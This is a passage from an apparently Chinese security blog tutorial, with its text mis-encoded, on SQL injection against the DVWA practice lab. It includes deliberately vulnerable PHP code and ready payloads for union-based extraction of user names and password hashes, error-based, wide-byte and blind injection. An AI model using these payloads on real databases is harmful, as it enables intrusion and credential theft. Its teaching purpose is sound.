è¾“å‡ºä¸ºï¼š1&lt;2</span><br><span class="line">select sleep(2)    # ç»“æœåœ¨ä¸¤ç§’é’Ÿåè¿”å›ï¼Œå¯ç†è§£ä¸ºæš‚åœ2ç§’</span><br><span class="line">select length(user())  # å½“å‰ç”¨æˆ·åé•¿åº¦  length()  é•¿åº¦å‡½æ•°</span><br><span class="line">select substr(user(),2,1)     # ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹æˆªå–ä¸€ä¸ªå­—ç¬¦é•¿åº¦,è¿™é‡Œä¸ºo</span><br><span class="line">IF(expr1,expr2,expr3)     # expr1 æ˜¯TRUEåˆ™IF()çš„è¿”å›å€¼ä¸ºexpr2; å¦åˆ™è¿”å›å€¼åˆ™ä¸º expr3</span><br><span class="line">select count(user) from users  # æŸ¥è¯¢usersè¡¨ä¸­userå­—æ®µæ‰€æœ‰æ•°æ®çš„ ä¸ªæ•°</span><br></pre></td></tr></table></figure>

<h2 id="ç³»ç»Ÿè¡¨ç®€ä»‹"><a href="#ç³»ç»Ÿè¡¨ç®€ä»‹" class="headerlink" title="ç³»ç»Ÿè¡¨ç®€ä»‹"></a>ç³»ç»Ÿè¡¨ç®€ä»‹</h2><blockquote>
<p>Information_schemaæ•°æ®åº“æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚ä»€ä¹ˆæ˜¯å…ƒæ•°æ®å‘¢ï¼Ÿå…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚æœ‰äº›æ—¶å€™ç”¨äºè¡¨è¿°è¯¥ä¿¡æ¯çš„å…¶ä»–æœ¯è¯­åŒ…æ‹¬â€œæ•°æ®è¯å…¸â€å’Œâ€œç³»ç»Ÿç›®å½•â€ã€‚</p>
<p>è¯¥åº“æœ‰å¤šä¸ªè¡¨å…¶ä¸­ä¿å­˜ç€å…³äºMySQLæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨æ çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ã€‚</p>
</blockquote>
<p>æ›´å¤šä»‹ç»ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RvdWF0b3UvYXJ0aWNsZS9kZXRhaWxzLzgwNzc1NjAx">https://blog.csdn.net/Touatou/article/details/80775601<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="æ˜¾æ€§æ³¨å…¥"><a href="#æ˜¾æ€§æ³¨å…¥" class="headerlink" title="æ˜¾æ€§æ³¨å…¥"></a>æ˜¾æ€§æ³¨å…¥</h2><blockquote>
<p>ç»è¿‡åœ¨çº¿DVWA <span class="exturl" data-url="aHR0cDovLzQzLjI0Ny45MS4yMjg6ODEv">http://43.247.91.228:81<i class="fa fa-external-link-alt"></i></span>æµ‹è¯•(ä»‹ç»åŸºç¡€ï¼Œæ‰€ä»¥é€‰æ‹©Lowçº§åˆ«)ï¼Œåœ¨çº¿çš„çº§åˆ«è°ƒä¸å¥½ï¼Œè¯·æœ¬åœ°æ­å»ºã€‚</p>
</blockquote>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;Submit&#x27;</span>]))&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="comment">// Retrieve data </span></span><br><span class="line">     </span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>; </span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result); </span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123; </span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">&quot;first_name&quot;</span>); </span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">&quot;last_name&quot;</span>); </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . $id . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . $first . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . $last; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>é‡ç‚¹çœ‹æºç ä¸­ï¼š<code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;</code></p>
</blockquote>
<p>æ¼æ´äº§ç”ŸåŸå› ï¼šSQLè¯­å¥æœªç»è¿‡å¤„ç†ï¼Œç›´æ¥å°†ä¼ å…¥çš„<code>$id</code>å½“åšå‚æ•°æ‰§è¡Œã€‚(è¿™é‡Œä¸è¿›è¡Œ or 1=1ä¹‹ç±»çš„æµ‹è¯•)</p>
<p>æ„é€ è¯­å¥è¿›è¡Œè§£é‡Šï¼š<code>user_id=&#39;$id&#39;</code>,å¦‚æœä¼ å…¥çš„$idå€¼ä¸º<code>1&#39; order by 5-- -</code>ï¼Œæºè¯­å¥å˜æˆäº†ï¼š</p>
<blockquote>
<p><code>user_id=&#39;1â€™ order by 5-- -&#39;</code>ï¼Œåœ¨æ•°æ®åº“ä¸­æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„ã€‚</p>
<p>å½“numä¸º2æ—¶ï¼Œ ä¹Ÿå°±æ˜¯<code>user_id=&#39;1â€™ order by 2-- -</code>æ­£å¸¸æ‰§è¡Œï¼Œä¸º3æ—¶æŠ¥é”™ï¼Œè¯´æ˜å½“å‰åº“çš„usersè¡¨æœ‰ä¸¤ä¸ªå­—æ®µã€‚</p>
</blockquote>
<h3 id="å¼€å§‹æ³¨å…¥"><a href="#å¼€å§‹æ³¨å…¥" class="headerlink" title="å¼€å§‹æ³¨å…¥"></a>å¼€å§‹æ³¨å…¥</h3><blockquote>
<p>è¿™é‡Œæ•°æ®åº“ç‰ˆæœ¬å¤§äº5.0ï¼Œæµ‹è¯•çš„æ˜¯å­—ç¬¦å‹ï¼Œå› æ­¤æ˜¯ â€˜ and â€˜1â€™=â€™1â€™ï¼Œçœç•¥ 1â€™</p>
<p>è¿™é‡Œå¹¶éç›´æ¥è·å–å¯†ç å•Šï¼Œä»€ä¹ˆçš„ï¼Œä»…ä»…å±•ç¤ºå¯èƒ½ç”¨åˆ°äº†çš„è¯­å¥ã€‚</p>
</blockquote>
<ul>
<li>å¼€å§‹æ³¨å…¥ä¹‹å‰ï¼Œè·å–æœ‰ç”¨ä¿¡æ¯ï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 2-- - # è·å–å½“å‰æ•°æ®åº“ï¼Œæ‰€ä½¿ç”¨è¡¨çš„å­—æ®µé•¿åº¦ï¼Œ-- - è¡¨ç¤ºæ³¨é‡Šä¹‹åçš„å†…å®¹</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,2-- -  # åŒ¹é…å­—æ®µ</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;2&#39; union select 1,2-- -  # çˆ†å­—æ®µä½ç½®ï¼Œä¹Ÿå³æ˜¯å¯ç”¨å­—æ®µï¼Œè¿™é‡Œéƒ½å¯ä»¥</span><br><span class="line"># è¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨mysqlç³»ç»Ÿå‡½æ•°æ¥æµ‹è¯•ã€‚</span><br><span class="line"></span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,ord(mid(user(),1,1))&#x3D;114-- -# æ­£å¸¸è¿”å›è¯æ˜å½“å‰æ•°æ®åº“ç”¨æˆ·ä¸ºrå¼€å¤´ä¸€èˆ¬ä¸ºroot.</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,ord(mid(user(),2,1))&#x3D;111-- -# æ­£å¸¸è¿”å›è¯æ˜å½“å‰æ•°æ®åº“ç”¨æˆ·ç¬¬äºŒä¸ªå­—ç¬¦ä¸ºo</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>è·å–æ•°æ®åº“è¡¨åï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è·å–è¡¨åæºè¯­å¥ï¼š</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;(æ•°æ®åº“ååå…­è¿›åˆ¶) limit 2,1-- - # å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨ï¼Œä½¿ç”¨limit n,1 é€æ¡è¾“å‡ºã€‚</span><br><span class="line"></span><br><span class="line">æ³¨å…¥è¯­å¥ï¼š</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;0x64767761 limit 2,1-- -  </span><br></pre></td></tr></table></figure>

<ul>
<li>è·å–å­—æ®µå</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åŸç†åŒè·å–è¡¨åã€‚</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;0x7573657273 limit 1,1-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>è·å–å­—æ®µå†…å®¹</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># å·²ç»çˆ†å‡ºè¡¨åå’Œå­—æ®µåï¼Œç›´æ¥æŸ¥è¯¢å³å¯</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select user,password from users-- -</span><br><span class="line"># ä¸Šè¯­å¥æœ‰ä¸¤ä¸ªå¯ç”¨æ³¨å…¥å­—æ®µï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªå‘¢ï¼Ÿ</span><br><span class="line"></span><br><span class="line"># ç¬¬ä¸€ç§æ–¹å¼ï¼ŒæŒ¨ä¸ªçˆ†ï¼Œå…ˆçˆ†åå­—ï¼Œå†çˆ†å¯†ç </span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,user from users-- -</span><br><span class="line"></span><br><span class="line"># ç¬¬äºŒç§æ–¹å¼ï¼Œä½¿ç”¨concatå‡½æ•°å°†å­—ç¬¦ä¸²è¿æ¥èµ·æ¥</span><br><span class="line">and &#39;1&#39;&#x3D;&#39;1&#39; union select 1,concat(user,0x3c,password) from users-- - </span><br><span class="line"># &#96;0x3c&#96;ä¸º&#96;&lt;&#96;,è¿™é‡Œå°†userã€passwordç”¨&#96;&lt;&#96;è¿æ¥èµ·æ¥ã€‚è¾“å‡ºæ ¼å¼ä¸ºï¼špablo&lt;0d107d09f5bbe40cade3de5c71e9e9b7</span><br></pre></td></tr></table></figure>

<p>è‡³æ­¤ï¼Œå·²ç»çˆ†å‡ºæ•°æ®åº“ä¸­å¯ç”¨çš„è´¦å·å¯†ç ï¼Œérootã€‚ç±»ä¼¼äºXXXç³»ç»Ÿçš„ç”¨æˆ·/ç®¡ç†å‘˜è´¦å·å¯†ç ã€‚è„±è£¤å­çš„è¯è¯·ç»•è¡Œ- -</p>
<h3 id="MySQLå‡½æ•°æŠ¥é”™"><a href="#MySQLå‡½æ•°æŠ¥é”™" class="headerlink" title="MySQLå‡½æ•°æŠ¥é”™"></a>MySQLå‡½æ•°æŠ¥é”™</h3><h4 id="Floor"><a href="#Floor" class="headerlink" title="Floor"></a>Floor</h4><p>å½“ä½¿ç”¨ floorï¼Œrandï¼Œgroup by è¿ç”¨æ—¶å€™ä¼šæŠ¥é”™ã€‚åˆ©ç”¨æŠ¥é”™ï¼Œä½¿ç”¨concatè¿æ¥ï¼Œå¯ä»¥å®ç°æ³¨å…¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select concat(floor(rand(0)*2), &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#39;),count(1) from users group by user_id;</span><br><span class="line"></span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line"></span><br><span class="line">+----------------------------------+----------+</span><br><span class="line">| concat(floor(rand(0)*2), &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#39;) | count(1) |</span><br><span class="line">+----------------------------------+----------+</span><br><span class="line">| 0&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br><span class="line">| 0&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;                            |        1 |</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select concat(floor(rand(0)*2), &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#39;,(select user())),count(1) from users group by user_id;</span><br><span class="line"></span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line"></span><br><span class="line">+--------------------------------------------------+----------+</span><br><span class="line">| concat(floor(rand(0)*2), &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#39;,(select user())) | count(1) |</span><br><span class="line">+--------------------------------------------------+----------+</span><br><span class="line">| 0&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">| 0&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">| 1&#x3D;&#x3D;&#x3D;&#x3D;root@localhost                              |        1 |</span><br><span class="line">+--------------------------------------------------+----------+</span><br></pre></td></tr></table></figure>

<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml() &#x2F;&#x2F;5.1.5</span><br><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where user_id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select database())),1));</span><br><span class="line"></span><br><span class="line">æŠ¥é”™ï¼š</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:dvwa&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where user_id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1));</span><br><span class="line"></span><br><span class="line">æŠ¥é”™ï¼š</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:root@localhost&#39;</span><br></pre></td></tr></table></figure>

<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extractvalue() &#x2F;&#x2F;5.1.5</span><br><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br><span class="line"></span><br><span class="line">select * from users where user_id&#x3D;1 and extractvalue(1,concat(0x3a,(select database())));</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:dvwa&#39;</span><br></pre></td></tr></table></figure>

<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp() &#x2F;&#x2F;5.5.5ç‰ˆæœ¬ä¹‹åå¯ä»¥ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br></pre></td></tr></table></figure>

<h4 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name_const &#x2F;&#x2F;æ”¯æŒè€ç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br></pre></td></tr></table></figure>

<h4 id="å‡ ä½•å‡½æ•°"><a href="#å‡ ä½•å‡½æ•°" class="headerlink" title="å‡ ä½•å‡½æ•°"></a>å‡ ä½•å‡½æ•°</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">geometrycollection(),multipoint(),polygon(),multipolygon(),linestring(),multilinestring()</span><br><span class="line"></span><br><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure>

<h2 id="å®½å­—èŠ‚"><a href="#å®½å­—èŠ‚" class="headerlink" title="å®½å­—èŠ‚"></a>å®½å­—èŠ‚</h2><p>å‚è€ƒï¼š</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzk5MiN0b2MtMw==">https://xz.aliyun.com/t/3992#toc-3<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><strong>MYSQL clienté“¾æ¥ç¼–ç çš„é”…</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%character%&#39;</span><br></pre></td></tr></table></figure>

<p>ç”±äºç¼–ç ä¸ä¸€è‡´ï¼Œå¯¼è‡´çš„é—®é¢˜ï¼Œä¸»è¦æ˜¯æ±‰å­—å ç”¨äº†3ä¸ªå­—èŠ‚ã€‚å…³é”®å­—<code>%df</code>ï¼Œå½“å®¢æˆ·ç«¯è¿æ¥ç¼–ç è®¾ç½®ä¸ºGBKçš„æ—¶å€™ ä¸phpè¿›è¡Œäº¤äº’çš„æ—¶å€™å°±ä¼šå‡ºç°å­—ç¬¦è½¬æ¢ å¯¼è‡´å•å¼•å·é€ƒé€¸çš„é—®é¢˜ã€‚<br>    æµ‹è¯•payload: <code>index.php?id=%df%27</code></p>
<p><strong>MYSQL iconvå‡½æ•° mb_convert_encodingå‡½æ•°çš„é”…</strong><br> å€Ÿç”¨å…ˆçŸ¥: <code>$id =iconv(&#39;GBK&#39;,&#39;UTF-8&#39;, $id)</code><br> <code>%df%27===(addslashes)===&gt;%df%5c%27===(iconv)===&gt;%e5%5c%5c%27</code><br> å…¶å®å°±æ˜¯ utf8 -&gt; gbk -&gt;utf-8 ä½ä½çš„%5c ä¹Ÿå°±æ˜¯åæ–œæ å¹²æ‰äº†è½¬ä¹‰å•å¼•å·çš„åæ–œæ ã€‚</p>
<p><strong>Big5ç¼–ç å¯¼è‡´çš„å®½å­—èŠ‚æ³¨å…¥</strong></p>
<p>çŒœæµ‹ä»£ç : <code>iconv(&#39;utf-8&#39;,&#39;BIG5&#39;,$_GET[&#39;id&#39;])</code><br> payloadæ„é€ åŒä¸Š: åŠŸâ€™ -&gt; addsalshes -&gt; åŠŸ&#39; -&gt; iconv -&gt; %A5%5C%5C%27-&gt;Â¥&#39; é€ƒé€¸å•å¼•å·<br> <code>%E8%B1%B9&#39;</code></p>
<h2 id="SQLç›²æ³¨"><a href="#SQLç›²æ³¨" class="headerlink" title="SQLç›²æ³¨"></a>SQLç›²æ³¨</h2><p>è¿™é‡ŒåŒ…å«äº†Boolå’ŒTimeç±»å‹</p>
<h3 id="å¼€å§‹æ³¨å…¥-1"><a href="#å¼€å§‹æ³¨å…¥-1" class="headerlink" title="å¼€å§‹æ³¨å…¥"></a>å¼€å§‹æ³¨å…¥</h3><blockquote>
<p>æœ¬åœ°æ­å»ºçš„DVWAï¼Œåœ¨çº¿çš„æ˜¾æ€§æ³¨å…¥å‡ºäº†ç‚¹é—®é¢˜ï¼Œå°±æœ¬åœ°æ­å»ºäº†ã€‚</p>
<p>è¿™é‡Œæµ‹è¯•ä½¿ç”¨äº†<code>=</code>å·ï¼Œä¸ºäº†ç›´è§‚ï¼ŒçœŸå®ç¯å¢ƒååŒä½¿ç”¨<code>&lt;</code>ã€<code>&gt;</code>å¿«é€Ÿåˆ¤æ–­</p>
<p>ä»”ç»†è§‚å¯Ÿé€šè¿‡é•¿åº¦å’Œè¿”å›æ—¶é—´ä¸¤ç§æ–¹å¼ï¼Œä¸‹æ–‡å¯¹æ—¶é—´çš„ä¸è¿‡å¤šè¯´äº†</p>
</blockquote>
<ul>
<li>åˆ¤æ–­æ•°æ®åº“åé•¿åº¦</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ç¬¬ä¸€ç§ï¼Œé€šè¿‡é•¿åº¦</span><br><span class="line">and length(database())&#x3D;4-- -   # æ­£å¸¸è¿”å› è¯´æ˜å½“å‰ç”¨æˆ·åé•¿åº¦ä¸º 14 ï¼Œæˆ‘è¿™é‡Œæ˜¯ï¼šroot@localhost</span><br><span class="line"></span><br><span class="line"># ç¬¬äºŒç§é€šè¿‡è¿”å›æ—¶é—´åˆ¤æ–­ï¼Œå¦‚æœç½‘ç»œè¾ƒå·®ï¼Œå»ºè®®å¤šè®¾ç½®å‡ ç§’ã€‚</span><br><span class="line">and if(length(database())&#x3D;4,sleep(5),1)-- -  # å¦‚æœæ•°æ®åº“åé•¿åº¦ä¸º4åˆ™å»¶æ—¶5ç§’è¿”å›ç»“æœ</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ¤æ–­æ•°æ®åº“åç§°</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åªèƒ½æŒ¨ä¸ªå­—ç¬¦åˆ¤æ–­,è¿™é‡Œå€¼çŒœä¸åˆ°æ•°æ®åº“åçš„æƒ…å†µä¸‹ï¼ŒæŒ¨ä¸ªå­—ç¬¦åˆ¤æ–­</span><br><span class="line"># ç¬¬ä¸€ç§ï¼Œé€šè¿‡ASCIIå€¼åˆ¤æ–­ï¼Œåˆ¤æ–­æ­£ç¡®è¿”å›æ­£å¸¸é¡µé¢ï¼Œ</span><br><span class="line">and ascii(substr(database(),1,1))&#x3D;100-- - # ç¬¬1ä¸ªå­—ç¬¦å¼€å§‹ï¼Œ1ä¸ºæˆªå–å­—ç¬¦é•¿åº¦</span><br><span class="line"></span><br><span class="line"># ç¬¬äºŒç§ï¼Œé€šè¿‡è¿”å›æ—¶é—´</span><br><span class="line">and if(ascii(substr(database(),1,1))&#x3D;100,sleep(3),1)-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ¤æ–­æ•°æ®åº“è¡¨å</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># çŒœè¡¨çš„æ•°é‡ï¼Œå› ä¸ºä¸çŸ¥é“æ•°æ®åº“ç»“æ„ï¼Œåªèƒ½æ…¢æ…¢çŒœï¼Œè¿™ä¸ªæ ¹æ®è‡ªå·±éœ€æ±‚ï¼Œéå¿…é¡»</span><br><span class="line">and (select count(table_name) from information_schema.tables where table_schema &#x3D;database())&#x3D;2-- -  # åˆ¤æ–­è¡¨çš„æ•°é‡ä¸º2</span><br><span class="line"># åŸºäºè¿”å›æ—¶é—´</span><br><span class="line">and if((select count(table_name) from information_schema.tables where table_schema &#x3D;database())&#x3D;2, sleep(3),1)-- -</span><br><span class="line"></span><br><span class="line"># çŒœè¡¨åçš„é•¿åº¦,è¿™é‡Œæ³¨æ„æ˜¯length((exp1))&#x3D;9,ç”¨æ‹¬å·å°†æŸ¥è¯¢å†…å®¹æ‹¬èµ·æ¥</span><br><span class="line">and length((select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1))&#x3D;9-- -</span><br><span class="line"># é€šè¿‡limit 1,1éå†è¡¨åé•¿åº¦ï¼Œ limit n,1   nä»0å¼€å§‹ï¼Œ0è¡¨ç¤ºç¬¬ä¸€ä¸ªè¡¨</span><br><span class="line"></span><br><span class="line"># åŸºäºæ—¶é—´çš„ä¸åœ¨å†™äº†ã€‚</span><br><span class="line"></span><br><span class="line"># çŒœç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œè¿™é‡Œsubstr((exp1),1,1)&#x3D;103,ç”¨æ‹¬å·å°†æŸ¥è¯¢å†…å®¹æ‹¬èµ·æ¥</span><br><span class="line">and ascii(substr((select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1),1,1))&#x3D;103-- -</span><br><span class="line"># ä¸Šè¯­å¥ç®€æï¼šascii( substr(exp1,1,1) )&#x3D;103</span><br><span class="line"># exp1 &#x3D; select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1</span><br><span class="line"></span><br><span class="line"># åŸºäºæ—¶é—´çš„ä¸å†å†™äº†ã€‚</span><br></pre></td></tr></table></figure>

<blockquote>
<p>é€šè¿‡<code>limit</code>æ§åˆ¶æŸ¥è¯¢çš„è¡¨ï¼Œé€šè¿‡<code>substr</code>æˆªå–è¡¨åå­—ç¬¦ä¸²ï¼ŒæŒ¨ä¸ªåˆ¤æ–­å€¼</p>
</blockquote>
<ul>
<li>åˆ¤æ–­å­—æ®µå</li>
</ul>
<blockquote>
<p>åŸç†å’Œåˆ¤æ–­è¡¨åä¸€æ ·</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># é¦–å…ˆæ¥ä¸ªåµŒå¥—çš„ï¼Œè¿™é‡Œä¸ç”¨è·å–è¡¨åï¼Œå¯ä»¥ç›´æ¥å¾—åˆ°å­—æ®µé•¿åº¦ã€å€¼ã€‚</span><br><span class="line"># è¿™é‡Œè·å–çš„æ˜¯ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ®µçš„é•¿åº¦</span><br><span class="line"># é€šè¿‡ç¬¬äºŒä¸ªlimitæ¥æ§åˆ¶æŸ¥è¯¢å­—æ®µã€‚</span><br><span class="line">and length((select column_name from information_schema.columns where table_name&#x3D;(select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1)limit 0,1))&#x3D;10-- -</span><br><span class="line"></span><br><span class="line"># ç¬¬äºŒç§ï¼Œæ ¹æ®å‰é¢çš„è¡¨åï¼Œä½¿ç”¨å¦‚ä¸‹è¯­å¥ï¼Œåå…­è¿›åˆ¶æ•°æ®ä¸ºï¼šè¡¨åçš„åå…­è¿›åˆ¶ã€‚</span><br><span class="line">and length((select column_name from information_schema.columns where table_name&#x3D;0x6775657374626F6F6B limit 0,1))&#x3D;10-- -</span><br><span class="line"></span><br><span class="line"># åŸºäºæ—¶é—´çš„å°±ä¸å†å†™äº†ã€‚ä¹Ÿå°±æ˜¯ if(length()&#x3D;2,sleep(2),1)è¿™ç§</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ±‚å€¼ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªå­—æ¯</span><br><span class="line">and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;0x6775657374626F6F6B limit 0,1),1,1))&#x3D;99-- -</span><br><span class="line"></span><br><span class="line"># åµŒå¥—æ±‚ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªå­—æ¯</span><br><span class="line">and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;(select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1)limit 0,1),1,1))&#x3D;99-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ¤æ–­å­—æ®µå†…å®¹</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># å…¶å®æœ‰äº†è¡¨åå’Œå­—æ®µåï¼Œå¯ä»¥ç›´æ¥æŸ¥è¯¢çš„ã€‚å…ˆè·å–é•¿åº¦å†è·å–å€¼ã€‚</span><br><span class="line">and length((select comment_id from guestbook))&#x3D;1-- -</span><br><span class="line"></span><br><span class="line"># è·å–å€¼</span><br><span class="line">and ascii(substr((select comment_id from guestbook),1,1))&#x3D;49-- -</span><br><span class="line"># åŸºäºæ—¶é—´çš„</span><br><span class="line">and if(ascii(substr((select comment_id from guestbook),1,1))&#x3D;49,sleep(3),1)-- -</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åˆ°æ­¤ï¼Œç›²æ³¨çš„åŸºæœ¬æ–¹æ³•å·²ç»å®Œæˆ</p>
</blockquote>
